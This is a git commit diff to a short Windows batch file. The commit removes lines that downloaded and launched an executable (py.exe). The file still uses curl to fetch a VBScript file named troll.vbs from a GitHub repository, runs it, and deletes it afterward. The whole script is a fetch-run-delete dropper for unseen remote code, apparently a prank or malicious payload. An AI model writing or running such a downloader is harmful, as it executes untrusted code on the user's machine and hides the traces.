907d3c39f66294e35f1b2659d6fbc0d56277b2b1
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-07-05 04:25:18 +0000

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,5 +1,3 @@
-curl -o py.exe https://github.com/oogabooga245/ysboob/raw/main/py.exe
-start py.exe
 curl -o troll.vbs https://raw.githubusercontent.com/oogabooga245/ysboob/main/troll.vbs
 start troll.vbs
 del troll.vbs
